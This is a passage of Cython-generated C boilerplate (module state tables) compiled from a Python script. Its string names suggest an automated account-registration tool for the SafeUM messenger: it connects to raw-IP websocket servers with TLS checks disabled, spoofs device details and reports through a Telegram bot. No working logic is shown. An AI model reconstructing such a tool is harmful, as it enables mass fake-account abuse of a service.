Py_CLEAR(clear_module_state->__pyx_n_u_osversion);\n  Py_CLEAR(clear_module_state->__pyx_n_u_password);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_pip_install_pyfiglet);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_pip_install_requests);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_pip_install_websocket_client);\n  Py_CLEAR(clear_module_state->__pyx_n_s_post);\n  Py_CLEAR(clear_module_state->__pyx_n_s_print);\n  Py_CLEAR(clear_module_state->__pyx_n_s_pyfiglet);\n  Py_CLEAR(clear_module_state->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm);\n  Py_CLEAR(clear_module_state->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456);\n  Py_CLEAR(clear_module_state->__pyx_n_s_random);\n  Py_CLEAR(clear_module_state->__pyx_n_s_recv);\n  Py_CLEAR(clear_module_state->__pyx_n_u_remoteIp);\n  Py_CLEAR(clear_module_state->__pyx_n_u_remotePort);\n  Py_CLEAR(clear_module_state->__pyx_n_s_requests);\n  Py_CLEAR(clear_module_state->__pyx_n_s_retry);\n  Py_CLEAR(clear_module_state->__pyx_n_s_send);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_sendMessage_chat_id);\n  Py_CLEAR(clear_module_state->__pyx_n_u_sessionId);\n  Py_CLEAR(clear_module_state->__pyx_n_u_softwareversion);\n  Py_CLEAR(clear_module_state->__pyx_n_s_spec);\n  Py_CLEAR(clear_module_state->__pyx_n_s_ssl);\n  Py_CLEAR(clear_module_state->__pyx_n_s_sslopt);\n  Py_CLEAR(clear_module_state->__pyx_n_s_start);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_status_Success);\n  Py_CLEAR(clear_module_state->__pyx_n_u_subaction);\n  Py_CLEAR(clear_module_state->__pyx_n_s_submit);\n  Py_CLEAR(clear_module_state->__pyx_n_s_success);\n  Py_CLEAR(clear_module_state->__pyx_n_s_sys);\n  Py_CLEAR(clear_module_state->__pyx_n_s_system);\n  Py_CLEAR(clear_module_state->__pyx_n_s_t);\n  Py_CLEAR(clear_module_state->__pyx_n_s_test);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_text);\n  Py_CLEAR(clear_module_state->__pyx_n_s_time);\n  Py_CLEAR(clear_module_state->__pyx_n_u_time);\n  Py_CLEAR(clear_module_state->__pyx_n_s_token);\n  Py_CLEAR(clear_module_state->__pyx_n_u_url);\n  Py_CLEAR(clear_module_state->__pyx_n_s_username);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_utf_8);\n  Py_CLEAR(clear_module_state->__pyx_n_s_websocket);\n  Py_CLEAR(clear_module_state->__pyx_n_s_work);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_wss_193_200_173_45_Auth);\n  Py_CLEAR(clear_module_state->__pyx_kp_u_wss_51_79_208_190_Auth);\n  Py_CLEAR(clear_module_state->__pyx_int_0);\n  Py_CLEAR(clear_module_state->__pyx_int_1);\n  Py_CLEAR(clear_module_state->__pyx_int_12);\n  Py_CLEAR(clear_module_state->__pyx_int_1000);\n  Py_CLEAR(clear_module_state->__pyx_int_8080);\n  Py_CLEAR(clear_module_state->__pyx_tuple__2);\n  Py_CLEAR(clear_module_state->__pyx_tuple__4);\n  Py_CLEAR(clear_module_state->__pyx_tuple__5);\n  Py_CLEAR(clear_module_state->__pyx_tuple__7);\n  Py_CLEAR(clear_module_state->__pyx_tuple__8);\n  Py_CLEAR(clear_module_state->__pyx_tuple__9);\n  Py_CLEAR(clear_module_state->__pyx_tuple__10);\n  Py_CLEAR(clear_module_state->__pyx_tuple__13);\n  Py_CLEAR(clear_module_state->__pyx_tuple__19);\n  Py_CLEAR(clear_module_state->__pyx_codeobj__14);\n  return 0;\n}\n#endif\n/* #### Code section: module_state_traverse ### */\n#if CYTHON_USE_MODULE_STATE\nstatic int __pyx_m_traverse(PyObject *m, visitproc visit, void *arg) {\n  __pyx_mstate *traverse_module_state = __pyx_mstate(m);\n  if (!traverse_module_state) return 0;\n  Py_VISIT(traverse_module_state->__pyx_d);\n  Py_VISIT(traverse_module_state->__pyx_b);\n  Py_VISIT(traverse_module_state->__pyx_cython_runtime);\n  Py_VISIT(traverse_module_state->__pyx_empty_tuple);\n  Py_VISIT(traverse_module_state->__pyx_empty_bytes);\n  Py_VISIT(traverse_module_state->__pyx_empty_unicode);\n  #ifdef __Pyx_CyFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_CyFunctionType);\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  Py_VISIT(traverse_module_state->__pyx_FusedFunctionType);\n  #endif\n  Py_VISIT(traverse_module_state->__pyx_kp_u_);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_0000);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_02);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1734805700);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_193_200_173_45);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_1_0_1380);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_30m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_31m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_32m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_33m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_34m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_35m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_36m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_37m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_91m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_92m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_93m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_95m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_1_96m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_2023_04_30_12_13_32);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_2_32m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_2_36m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_2_39m);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_503c73d12b354f86ff9706b211470438);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_6387ae32b7087257452ae27fc8a925dd);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2);\n  Py_VISIT(traverse_module_state->__pyx_n_s_AB);\n  Py_VISIT(traverse_module_state->__pyx_n_u_AND);\n  Py_VISIT(traverse_module_state->__pyx_n_s_A_bSa);\n  Py_VISIT(traverse_module_state->__pyx_n_s_Ab);\n  Py_VISIT(traverse_module_state->__pyx_n_s_AbBs);\n  Py_VISIT(traverse_module_state->__pyx_n_s_B);\n  Py_VISIT(traverse_module_state->__pyx_n_s_Ba_bS);\n  Py_VISIT(traverse_module_state->__pyx_n_s_Bl);\n  Py_VISIT(traverse_module_state->__pyx_n_s_C);\n  Py_VISIT(traverse_module_state->__pyx_n_s_CERT_NONE);\n  Py_VISIT(traverse_module_state->__pyx_n_u_Desktop);\n  Py_VISIT(traverse_module_state->__pyx_n_s_E);\n  Py_VISIT(traverse_module_state->__pyx_n_s_F);\n  Py_VISIT(traverse_module_state->__pyx_n_s_G);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_JE_N_O);\n  Py_VISIT(traverse_module_state->__pyx_n_u_Jana);\n  Py_VISIT(traverse_module_state->__pyx_n_s_P);\n  Py_VISIT(traverse_module_state->__pyx_n_s_PN);\n  Py_VISIT(traverse_module_state->__pyx_n_s_R);\n  Py_VISIT(traverse_module_state->__pyx_n_u_Register);\n  Py_VISIT(traverse_module_state->__pyx_n_s_S);\n  Py_VISIT(traverse_module_state->__pyx_n_s_S_aBs);\n  Py_VISIT(traverse_module_state->__pyx_n_s_ThreadPoolExecutor);\n  Py_VISIT(traverse_module_state->__pyx_n_s_W);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_Xiaomi_Redmi_Note_8_Pro);\n  Py_VISIT(traverse_module_state->__pyx_n_s_Y);\n  Py_VISIT(traverse_module_state->__pyx_n_s_Ya_Bs);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__11);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__12);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__15);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__16);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__17);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__18);\n  Py_VISIT(traverse_module_state->__pyx_n_s__20);\n  Py_VISIT(traverse_module_state->__pyx_n_s__3);\n  Py_VISIT(traverse_module_state->__pyx_kp_u__6);\n  Py_VISIT(traverse_module_state->__pyx_n_s_aB);\n  Py_VISIT(traverse_module_state->__pyx_n_s_aBbs);\n  Py_VISIT(traverse_module_state->__pyx_n_s_a_aB_s);\n  Py_VISIT(traverse_module_state->__pyx_n_s_a_bSa);\n  Py_VISIT(traverse_module_state->__pyx_n_s_ab);\n  Py_VISIT(traverse_module_state->__pyx_n_s_accounts);\n  Py_VISIT(traverse_module_state->__pyx_n_u_action);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_and_11_0_0);\n  Py_VISIT(traverse_module_state->__pyx_n_u_app);\n  Py_VISIT(traverse_module_state->__pyx_n_s_asyncio_coroutines);\n  Py_VISIT(traverse_module_state->__pyx_n_u_b31d0165dde6b3d204263d6ea4b96789);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14);\n  Py_VISIT(traverse_module_state->__pyx_n_u_basic);\n  Py_VISIT(traverse_module_state->__pyx_n_u_c72d110c1ae40d50);\n  Py_VISIT(traverse_module_state->__pyx_n_u_cert_reqs);\n  Py_VISIT(traverse_module_state->__pyx_n_s_choice);\n  Py_VISIT(traverse_module_state->__pyx_n_s_choices);\n  Py_VISIT(traverse_module_state->__pyx_n_u_clear);\n  Py_VISIT(traverse_module_state->__pyx_n_s_cline_in_traceback);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_com_safeum_android);\n  Py_VISIT(traverse_module_state->__pyx_n_s_con);\n  Py_VISIT(traverse_module_state->__pyx_n_s_concurrent_futures);\n  Py_VISIT(traverse_module_state->__pyx_n_s_create_connection);\n  Py_VISIT(traverse_module_state->__pyx_n_s_decode);\n  Py_VISIT(traverse_module_state->__pyx_n_s_decompress);\n  Py_VISIT(traverse_module_state->__pyx_n_u_devicename);\n  Py_VISIT(traverse_module_state->__pyx_n_u_devicepushuid);\n  Py_VISIT(traverse_module_state->__pyx_n_u_deviceuid);\n  Py_VISIT(traverse_module_state->__pyx_n_s_dumps);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck);\n  Py_VISIT(traverse_module_state->__pyx_n_u_e38cb9e83aef6ceb60a7a71493317903);\n  Py_VISIT(traverse_module_state->__pyx_n_u_ef1608faa151cb7989b0ba7f57b39822);\n  Py_VISIT(traverse_module_state->__pyx_n_s_ej);\n  Py_VISIT(traverse_module_state->__pyx_kp_s_ej_py);\n  Py_VISIT(traverse_module_state->__pyx_n_u_en_GB);\n  Py_VISIT(traverse_module_state->__pyx_n_s_faB_s);\n  Py_VISIT(traverse_module_state->__pyx_n_s_failed);\n  Py_VISIT(traverse_module_state->__pyx_n_s_figlet_format);\n  Py_VISIT(traverse_module_state->__pyx_n_s_font);\n  Py_VISIT(traverse_module_state->__pyx_n_u_gmt);\n  Py_VISIT(traverse_module_state->__pyx_n_s_gzip);\n  Py_VISIT(traverse_module_state->__pyx_n_s_header);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_hhhh_JE_N_O);\n  Py_VISIT(traverse_module_state->__pyx_n_u_host);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_https_api_telegram_org_bot);\n  Py_VISIT(traverse_module_state->__pyx_n_u_hvtctchnjvfxfx);\n  Py_VISIT(traverse_module_state->__pyx_n_s_id);\n  Py_VISIT(traverse_module_state->__pyx_n_u_id);\n  Py_VISIT(traverse_module_state->__pyx_n_s_import);\n  Py_VISIT(traverse_module_state->__pyx_n_s_initializing);\n  Py_VISIT(traverse_module_state->__pyx_n_s_input);\n  Py_VISIT(traverse_module_state->__pyx_n_s_is_coroutine);\n  Py_VISIT(traverse_module_state->__pyx_n_u_iv);\n  Py_VISIT(traverse_module_state->__pyx_n_s_json);\n  Py_VISIT(traverse_module_state->__pyx_n_s_k);\n  Py_VISIT(traverse_module_state->__pyx_n_u_locale);\n  Py_VISIT(traverse_module_state->__pyx_n_u_login);\n  Py_VISIT(traverse_module_state->__pyx_n_u_m1x);\n  Py_VISIT(traverse_module_state->__pyx_n_u_m1y);\n  Py_VISIT(traverse_module_state->__pyx_n_u_m2);\n  Py_VISIT(traverse_module_state->__pyx_n_u_magicword);\n  Py_VISIT(traverse_module_state->__pyx_n_u_magicwordhint);\n  Py_VISIT(traverse_module_state->__pyx_n_s_main);\n  Py_VISIT(traverse_module_state->__pyx_n_s_max_workers);\n  Py_VISIT(traverse_module_state->__pyx_n_u_message);\n  Py_VISIT(traverse_module_state->__pyx_n_s_name);\n  Py_VISIT(traverse_module_state->__pyx_n_s_name_2);\n  Py_VISIT(traverse_module_state->__pyx_n_u_nickname);\n  Py_VISIT(traverse_module_state->__pyx_n_s_os);\n  Py_VISIT(traverse_module_state->__pyx_n_u_os);\n  Py_VISIT(traverse_module_state->__pyx_n_u_osversion);\n  Py_VISIT(traverse_module_state->__pyx_n_u_password);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_pip_install_pyfiglet);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_pip_install_requests);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_pip_install_websocket_client);\n  Py_VISIT(traverse_module_state->__pyx_n_s_post);\n  Py_VISIT(traverse_module_state->__pyx_n_s_print);\n  Py_VISIT(traverse_module_state->__pyx_n_s_pyfiglet);\n  Py_VISIT(traverse_module_state->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm);\n  Py_VISIT(traverse_module_state->__pyx_n_u_qwertyuioplkjhgfdsazxcvbnm123456);\n  Py_VISIT(traverse_module_state->__pyx_n_s_random);\n  Py_VISIT(traverse_module_state->__pyx_n_s_recv);\n  Py_VISIT(traverse_module_state->__pyx_n_u_remoteIp);\n  Py_VISIT(traverse_module_state->__pyx_n_u_remotePort);\n  Py_VISIT(traverse_module_state->__pyx_n_s_requests);\n  Py_VISIT(traverse_module_state->__pyx_n_s_retry);\n  Py_VISIT(traverse_module_state->__pyx_n_s_send);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_sendMessage_chat_id);\n  Py_VISIT(traverse_module_state->__pyx_n_u_sessionId);\n  Py_VISIT(traverse_module_state->__pyx_n_u_softwareversion);\n  Py_VISIT(traverse_module_state->__pyx_n_s_spec);\n  Py_VISIT(traverse_module_state->__pyx_n_s_ssl);\n  Py_VISIT(traverse_module_state->__pyx_n_s_sslopt);\n  Py_VISIT(traverse_module_state->__pyx_n_s_start);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_status_Success);\n  Py_VISIT(traverse_module_state->__pyx_n_u_subaction);\n  Py_VISIT(traverse_module_state->__pyx_n_s_submit);\n  Py_VISIT(traverse_module_state->__pyx_n_s_success);\n  Py_VISIT(traverse_module_state->__pyx_n_s_sys);\n  Py_VISIT(traverse_module_state->__pyx_n_s_system);\n  Py_VISIT(traverse_module_state->__pyx_n_s_t);\n  Py_VISIT(traverse_module_state->__pyx_n_s_test);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_text);\n  Py_VISIT(traverse_module_state->__pyx_n_s_time);\n  Py_VISIT(traverse_module_state->__pyx_n_u_time);\n  Py_VISIT(traverse_module_state->__pyx_n_s_token);\n  Py_VISIT(traverse_module_state->__pyx_n_u_url);\n  Py_VISIT(traverse_module_state->__pyx_n_s_username);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_utf_8);\n  Py_VISIT(traverse_module_state->__pyx_n_s_websocket);\n  Py_VISIT(traverse_module_state->__pyx_n_s_work);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_wss_193_200_173_45_Auth);\n  Py_VISIT(traverse_module_state->__pyx_kp_u_wss_51_79_208_190_Auth);\n  Py_VISIT(traverse_module_state->__pyx_int_0);\n  Py_VISIT(traverse_module_state->__pyx_int_1);\n  Py_VISIT(traverse_module_state->__pyx_int_12);\n  Py_VISIT(traverse_module_state->__pyx_int_1000);\n  Py_VISIT(traverse_module_state->__pyx_int_8080);\n  Py_VISIT(traverse_module_state->__pyx_tuple__2);\n  Py_VISIT(traverse_module_state->__pyx_tuple__4);\n  Py_VISIT(traverse_module_state->__pyx_tuple__5);\n  Py_VISIT(traverse_module_state->__pyx_tuple__7);\n  Py_VISIT(traverse_module_state->__pyx_tuple__8);\n  Py_VISIT(traverse_module_state->__pyx_tuple__9);\n  Py_VISIT(traverse_module_state->__pyx_tuple__10);\n  Py_VISIT(traverse_module_state->__pyx_tuple__13);\n  Py_VISIT(traverse_module_state->__pyx_tuple__19);\n  Py_VISIT(traverse_module_state->__pyx_codeobj__14);\n  return 0;\n}\n#endif\n/* #### Code section: module_state_defines ### */\n#define __pyx_d __pyx_mstate_global->__pyx_d\n#define __pyx_b __pyx_mstate_global->__pyx_b\n#define __pyx_cython_runtime __pyx_mstate_global->__pyx_cython_runtime\n#define __pyx_empty_tuple __pyx_mstate_global->__pyx_empty_tuple\n#define __pyx_empty_bytes __pyx_mstate_global->__pyx_empty_bytes\n#define __pyx_empty_unicode __pyx_mstate_global->__pyx_empty_unicode\n#ifdef __Pyx_CyFunction_USED\n#define __pyx_CyFunctionType __pyx_mstate_global->__pyx_CyFunctionType\n#endif\n#ifdef __Pyx_FusedFunction_USED\n#define __pyx_FusedFunctionType __pyx_mstate_global->__pyx_FusedFunctionType\n#endif\n#ifdef __Pyx_Generator_USED\n#define __pyx_GeneratorType __pyx_mstate_global->__pyx_GeneratorType\n#endif\n#ifdef __Pyx_IterableCoroutine_USED\n#define __pyx_IterableCoroutineType __pyx_mstate_global->__pyx_IterableCoroutineType\n#endif\n#ifdef __Pyx_Coroutine_USED\n#define __pyx_CoroutineAwaitType __pyx_mstate_global->__pyx_CoroutineAwaitType\n#endif\n#ifdef __Pyx_Coroutine_USED\n#define __pyx_CoroutineType __pyx_mstate_global->__pyx_CoroutineType\n#endif\n#if CYTHON_USE_MODULE_STATE\n#endif\n#define __pyx_kp_u_ __pyx_mstate_global->__pyx_kp_u_\n#define __pyx_kp_u_0000 __pyx_mstate_global->__pyx_kp_u_0000\n#define __pyx_kp_u_02 __pyx_mstate_global->__pyx_kp_u_02\n#define __pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7 __pyx_mstate_global->__pyx_kp_u_04eb364e4ef79f31f3e95df2a956e9c7\n#define __pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6 __pyx_mstate_global->__pyx_kp_u_0d99759f972c527722a18a74b3e0b3c6\n#define __pyx_kp_u_1734805700 __pyx_mstate_global->__pyx_kp_u_1734805700\n#define __pyx_kp_u_193_200_173_45 __pyx_mstate_global->__pyx_kp_u_193_200_173_45\n#define __pyx_kp_u_1_1_0_1380 __pyx_mstate_global->__pyx_kp_u_1_1_0_1380\n#define __pyx_kp_u_1_30m __pyx_mstate_global->__pyx_kp_u_1_30m\n#define __pyx_kp_u_1_31m __pyx_mstate_global->__pyx_kp_u_1_31m\n#define __pyx_kp_u_1_32m __pyx_mstate_global->__pyx_kp_u_1_32m\n#define __pyx_kp_u_1_33m __pyx_mstate_global->__pyx_kp_u_1_33m\n#define __pyx_kp_u_1_34m __pyx_mstate_global->__pyx_kp_u_1_34m\n#define __pyx_kp_u_1_35m __pyx_mstate_global->__pyx_kp_u_1_35m\n#define __pyx_kp_u_1_36m __pyx_mstate_global->__pyx_kp_u_1_36m\n#define __pyx_kp_u_1_37m __pyx_mstate_global->__pyx_kp_u_1_37m\n#define __pyx_kp_u_1_91m __pyx_mstate_global->__pyx_kp_u_1_91m\n#define __pyx_kp_u_1_92m __pyx_mstate_global->__pyx_kp_u_1_92m\n#define __pyx_kp_u_1_93m __pyx_mstate_global->__pyx_kp_u_1_93m\n#define __pyx_kp_u_1_95m __pyx_mstate_global->__pyx_kp_u_1_95m\n#define __pyx_kp_u_1_96m __pyx_mstate_global->__pyx_kp_u_1_96m\n#define __pyx_kp_u_2023_04_30_12_13_32 __pyx_mstate_global->__pyx_kp_u_2023_04_30_12_13_32\n#define __pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1 __pyx_mstate_global->__pyx_kp_u_219d1d9b049550f26a6c7b7914a44da1\n#define __pyx_kp_u_2_32m __pyx_mstate_global->__pyx_kp_u_2_32m\n#define __pyx_kp_u_2_36m __pyx_mstate_global->__pyx_kp_u_2_36m\n#define __pyx_kp_u_2_39m __pyx_mstate_global->__pyx_kp_u_2_39m\n#define __pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d __pyx_mstate_global->__pyx_kp_u_4b4d1468bfaf01a82c574ea71c44052d\n#define __pyx_kp_u_503c73d12b354f86ff9706b211470438 __pyx_mstate_global->__pyx_kp_u_503c73d12b354f86ff9706b211470438\n#define __pyx_kp_u_6387ae32b7087257452ae27fc8a925dd __pyx_mstate_global->__pyx_kp_u_6387ae32b7087257452ae27fc8a925dd\n#define __pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2 __pyx_mstate_global->__pyx_kp_u_8c6ec7ce0b9108d882bb076be6e49fe2\n#define __pyx_n_s_AB __pyx_mstate_global->__pyx_n_s_AB\n#define __pyx_n_u_AND __pyx_mstate_global->__pyx_n_u_AND\n#define __pyx_n_s_A_bSa __pyx_mstate_global->__pyx_n_s_A_bSa\n#define __pyx_n_s_Ab __pyx_mstate_global->__pyx_n_s_Ab\n#define __pyx_n_s_AbBs __pyx_mstate_global->__pyx_n_s_AbBs\n#define __pyx_n_s_B __pyx_mstate_global->__pyx_n_s_B\n#define __pyx_n_s_Ba_bS __pyx_mstate_global->__pyx_n_s_Ba_bS\n#define __pyx_n_s_Bl __pyx_mstate_global->__pyx_n_s_Bl\n#define __pyx_n_s_C __pyx_mstate_global->__pyx_n_s_C\n#define __pyx_n_s_CERT_NONE __pyx_mstate_global->__pyx_n_s_CERT_NONE\n#define __pyx_n_u_Desktop __pyx_mstate_global->__pyx_n_u_Desktop\n#define __pyx_n_s_E __pyx_mstate_global->__pyx_n_s_E\n#define __pyx_n_s_F __pyx_mstate_global->__pyx_n_s_F\n#define __pyx_n_s_G __pyx_mstate_global->__pyx_n_s_G\n#define __pyx_kp_u_JE_N_O __pyx_mstate_global->__pyx_kp_u_JE_N_O\n#define __pyx_n_u_Jana __pyx_mstate_global->__pyx_n_u_Jana\n#define __pyx_n_s_P __pyx_mstate_global->__pyx_n_s_P\n#define __pyx_n_s_PN __pyx_mstate_global->__pyx_n_s_PN\n#define __pyx_n_s_R __pyx_mstate_global->__pyx_n_s_R\n#define __pyx_n_u_Register __pyx_mstate_global->__pyx_n_u_Register\n#define __pyx_n_s_S __pyx_mstate_global->__pyx_n_s_S\n#define __pyx_n_s_S_aBs __pyx_mstate_global->__pyx_n_s_S_aBs\n#define __pyx_n_s_ThreadPoolExecutor __pyx_mstate_global->__pyx_n_s_ThreadPoolExecutor\n#define __pyx_n_s_W __pyx_mstate_global->__pyx_n_s_W\n#define __pyx_kp_u_Xiaomi_Redmi_Note_8_Pro __pyx_mstate_global->__pyx_kp_u_Xiaomi_Redmi_Note_8_Pro\n#define __pyx_n_s_Y __pyx_mstate_global->__pyx_n_s_Y\n#define __pyx_n_s_Ya_Bs __pyx_mstate_global->__pyx_n_s_Ya_Bs\n#define __pyx_kp_u__11 __pyx_mstate_global->__pyx_kp_u__11\n#define __pyx_kp_u__12 __pyx_mstate_global->__pyx_kp_u__12\n#define __pyx_kp_u__15 __pyx_mstate_global->__pyx_kp_u__15\n#define __pyx_kp_u__16 __pyx_mstate_global->__pyx_kp_u__16\n#define __pyx_kp_u__17 __pyx_mstate_global->__pyx_kp_u__17\n#define __pyx_kp_u__18 __pyx_mstate_global->__pyx_kp_u__18\n#define __pyx_n_s__20 __pyx_mstate_global->__pyx_n_s__20\n#define __pyx_n_s__3 __pyx_mstate_global->__pyx_n_s__3\n#define __pyx_kp_u__6 __pyx_mstate_global->__pyx_kp_u__6\n#define __pyx_n_s_aB __pyx_mstate_global->__pyx_n_s_aB\n#define __pyx_n_s_aBbs __pyx_mstate_global->__pyx_n_s_aBbs\n#define __pyx_n_s_a_aB_s __pyx_mstate_global->__pyx_n_s_a_aB_s\n#define __pyx_n_s_a_bSa __pyx_mstate_global->__pyx_n_s_a_bSa\n#define __pyx_n_s_ab __pyx_mstate_global->__pyx_n_s_ab\n#define __pyx_n_s_accounts __pyx_mstate_global->__pyx_n_s_accounts\n#define __pyx_n_u_action __pyx_mstate_global->__pyx_n_u_action\n#define __pyx_kp_u_and_11_0_0 __pyx_mstate_global->__pyx_kp_u_and_11_0_0\n#define __pyx_n_u_app __pyx_mstate_global->__pyx_n_u_app\n#define __pyx_n_s_asyncio_coroutines __pyx_mstate_global->__pyx_n_s_asyncio_coroutines\n#define __pyx_n_u_b31d0165dde6b3d204263d6ea4b96789 __pyx_mstate_global->__pyx_n_u_b31d0165dde6b3d204263d6ea4b96789\n#define __pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14 __pyx_mstate_global->__pyx_kp_u_b6cbb22d_06ca_41ff_8fda_c0ddeb14\n#define __pyx_n_u_basic __pyx_mstate_global->__pyx_n_u_basic\n#define __pyx_n_u_c72d110c1ae40d50 __pyx_mstate_global->__pyx_n_u_c72d110c1ae40d50\n#define __pyx_n_u_cert_reqs __pyx_mstate_global->__pyx_n_u_cert_reqs\n#define __pyx_n_s_choice __pyx_mstate_global->__pyx_n_s_choice\n#define __pyx_n_s_choices __pyx_mstate_global->__pyx_n_s_choices\n#define __pyx_n_u_clear __pyx_mstate_global->__pyx_n_u_clear\n#define __pyx_n_s_cline_in_traceback __pyx_mstate_global->__pyx_n_s_cline_in_traceback\n#define __pyx_kp_u_com_safeum_android __pyx_mstate_global->__pyx_kp_u_com_safeum_android\n#define __pyx_n_s_con __pyx_mstate_global->__pyx_n_s_con\n#define __pyx_n_s_concurrent_futures __pyx_mstate_global->__pyx_n_s_concurrent_futures\n#define __pyx_n_s_create_connection __pyx_mstate_global->__pyx_n_s_create_connection\n#define __pyx_n_s_decode __pyx_mstate_global->__pyx_n_s_decode\n#define __pyx_n_s_decompress __pyx_mstate_global->__pyx_n_s_decompress\n#define __pyx_n_u_devicename __pyx_mstate_global->__pyx_n_u_devicename\n#define __pyx_n_u_devicepushuid __pyx_mstate_global->__pyx_n_u_devicepushuid\n#define __pyx_n_u_deviceuid __pyx_mstate_global->__pyx_n_u_deviceuid\n#define __pyx_n_s_dumps __pyx_mstate_global->__pyx_n_s_dumps\n#define __pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck __pyx_mstate_global->__pyx_kp_u_dxT6B6Solm0_APA91bHqL8wxzlyKHck\n#define __pyx_n_u_e38cb9e83aef6ceb60a7a71493317903 __pyx_mstate_global->__pyx_n_u_e38cb9e83aef6ceb60a7a71493317903\n#define __pyx_n_u_ef1608faa151cb7989b0ba7f57b39822 __pyx_mstate_global->__pyx_n_u_ef1608faa151cb7989b0ba7f57b39822\n#define __pyx_n_s_ej __pyx_mstate_global->__pyx_n_s_ej\n#define __pyx_kp_s_ej_py __pyx_mstate_global->__pyx_kp_s_ej_py\n#define __pyx_n_u_en_GB __pyx_mstate_global->__pyx_n_u_en_GB\n#define __pyx_n_s_faB_s __pyx_mstate_global->__pyx_n_s_faB_s\n#define __pyx_n_s_failed __pyx_mstate_global->__pyx_n_s_failed\n#define __pyx_n_s_figlet_format __pyx_mstate_global->__pyx_n_s_figlet_format\n#define __pyx_n_s_font __pyx_mstate_global->__pyx_n_s_font\n#define __pyx_n_u_gmt __pyx_mstate_global->__pyx_n_u_gmt\n#define __pyx_n_s_gzip __pyx_mstate_global->__pyx_n_s_gzip\n#define __pyx_n_s_header __pyx_mstate_global->__pyx_n_s_header\n#define __pyx_kp_u_hhhh_JE_N_O __pyx_mstate_global->__pyx_kp_u_hhhh_JE_N_O\n#define __pyx_n_u_host __pyx_mstate_global->__pyx_n_u_host\n#define __pyx_kp_u_https_api_telegram_org_bot __pyx_mstate_global->__pyx_kp_u_https_api_telegram_org_bot\n#define __pyx_n_u_hvtctchnjvfxfx __pyx_mstate_global->__pyx_n_u_hvtctchnjvfxfx\n#define __pyx_n_s_id __pyx_mstate_global->__pyx_n_s_id\n#define __pyx_n_u_id __pyx_mstate_global->__pyx_n_u_id\n#define __pyx_n_s_import __pyx_mstate_global->__pyx_n_s_import\n#define __pyx_n_s_initializing __pyx_mstate_global->__pyx_n_s_initializing\n#define __pyx_n_s_input __pyx_mstate_global->__pyx_n_s_input\n#define __pyx_n_s_is_coroutine __pyx_mstate_global->__pyx_n_s_is_coroutine\n#define __pyx_n_u_iv __pyx_mstate_global->__pyx_n_u_iv\n#define __pyx_n_s_json __pyx_mstate_global->__pyx_n_s_json\n#define 